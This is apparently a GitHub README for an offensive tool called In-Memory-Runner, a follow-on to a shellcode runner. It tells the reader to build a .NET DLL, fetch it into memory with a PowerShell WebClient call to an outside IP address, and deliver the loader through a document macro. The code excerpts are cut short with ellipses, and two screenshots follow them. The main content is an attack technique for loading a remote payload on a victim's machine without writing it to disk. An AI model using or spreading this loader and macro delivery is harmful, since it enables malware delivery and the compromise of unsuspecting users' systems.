# In-Memory-Runner
Continutation of https://github.com/VietTheBarbarian/ShellcodeRunnerC-

Create a .netframework class libary and build using x64 to create a dll 
```
using System;
...
Download with powershell. Exploit this by using macro
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.244/ClassLibrary1.dll')
...
![image](https://github.com/VietTheBarbarian/In-Memory-Runner/assets/56415307/bf4cf4d3-8f6b-4b9b-88ff-d3a6fd49dfbc)

![image](https://github.com/VietTheBarbarian/In-Memory-Runner/assets/56415307/d2e79daf-48d3-48cc-aa1d-f1576d982f89)
